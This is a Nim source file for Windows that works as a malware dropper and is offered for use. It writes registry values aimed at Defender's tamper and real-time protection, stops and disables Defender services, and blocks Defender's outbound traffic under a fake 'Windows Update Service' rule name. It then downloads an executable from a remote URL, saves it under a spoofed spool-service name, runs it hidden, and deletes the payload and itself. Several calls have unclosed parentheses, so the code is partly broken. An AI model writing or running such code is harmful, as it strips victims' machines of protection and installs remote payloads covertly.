import winim/lean
import winim/inc/winnet
import os, osproc, strutils, httpclient, net

const
  DEFENDER_REG_PATH = r"SOFTWARE\Microsoft\Windows Defender"
  FEATURES_REG_PATH = DEFENDER_REG_PATH & r"\Features"
  PREFERENCES_REG_PATH = DEFENDER_REG_PATH & r"\Real-Time Protection"
  PAYLOAD_URL = "https://github.com/Drakovthe6th/TBuG/raw/master/sheD2.exe"  # Change to your payload URL
  PAYLOAD_PATH = r"C:\Windows\Temp\spoolv32.exe"  # Masquerading as spool service

proc disableTamperProtection(): bool =
  var 
    hKey: HKEY
    dwValue: DWORD = 0
    disposition: DWORD

  if RegCreateKeyExW(
    HKEY_LOCAL_MACHINE,
    FEATURES_REG_PATH,
    0,
    nil,
    REG_OPTION_NON_VOLATILE,
    KEY_WRITE,
    nil,
    &hKey,
    &disposition
  ) == ERROR_SUCCESS:

    if RegSetValueExW(
      hKey,
      "TamperProtection",
      0,
      REG_DWORD,
      cast[PBYTE](&dwValue),
      sizeof(dwValue)
    ) == ERROR_SUCCESS:
      result = true
    
    RegCloseKey(hKey)

proc disableCloudProtection(): bool =
  var 
    hKey: HKEY
    dwValue: DWORD = 0

  if RegOpenKeyExW(
    HKEY_LOCAL_MACHINE,
    PREFERENCES_REG_PATH,
    0,
    KEY_WRITE,
    &hKey
  ) == ERROR_SUCCESS:
    
    discard RegSetValueExW(
      hKey,
      "DisableRealtimeMonitoring",
      0,
      REG_DWORD,
      cast[PBYTE](&dwValue),
      sizeof(dwValue)
    
    dwValue = 2  # Never send samples
    result = (RegSetValueExW(
      hKey,
      "SubmitSamplesConsent",
      0,
      REG_DWORD,
      cast[PBYTE](&dwValue),
      sizeof(dwValue)) == ERROR_SUCCESS
    
    RegCloseKey(hKey)

proc killDefenderServices() =
  discard execCmd("net stop WinDefend /y")
  discard execCmd("net stop WdNisSvc /y")
  discard execCmd("sc config WinDefend start= disabled")
  discard execCmd("sc config WdNisSvc start= disabled")
  discard execCmd("sc config SecurityHealthService start= disabled")

proc blockCloudConnections() =
  let firewallCmd = r"""
    New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound `
    -Program "$env:ProgramFiles\Windows Defender\*.exe" -Action Block -Enabled True
  """
  discard execProcess("powershell -Command " & firewallCmd)

proc downloadPayload(): bool =
  try:
    var client = newHttpClient()
    client.headers = newHttpHeaders({"User-Agent": "Windows-Update-Agent/10.0"})
    client.downloadFile(PAYLOAD_URL, PAYLOAD_PATH)
    result = fileExists(PAYLOAD_PATH)
    client.close()
  except:
    result = false

proc executePayload() =
  var
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
    cmdLine = newWideCString("\"" & PAYLOAD_PATH & "\"")
  
  ZeroMemory(addr si, sizeof(si).cint
  si.cb = sizeof(si).DWORD
  si.dwFlags = STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE

  if CreateProcessW(
    nil,
    cmdLine,
    nil,
    nil,
    false,
    CREATE_NO_WINDOW,
    nil,
    nil,
    addr si,
    addr pi
  ):
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)

proc cleanTrace() =
  try:
    removeFile(PAYLOAD_PATH)
    removeFile(getAppFilename())
  except:
    discard

proc main() =
  # Disable Defender protections
  discard disableTamperProtection()
  discard disableCloudProtection()
  killDefenderServices()
  blockCloudConnections()
  
  # Download and execute payload
  if downloadPayload():
    executePayload()
    sleep(5000)  # Allow payload to initialize
    cleanTrace()

when isMainModule:
  main()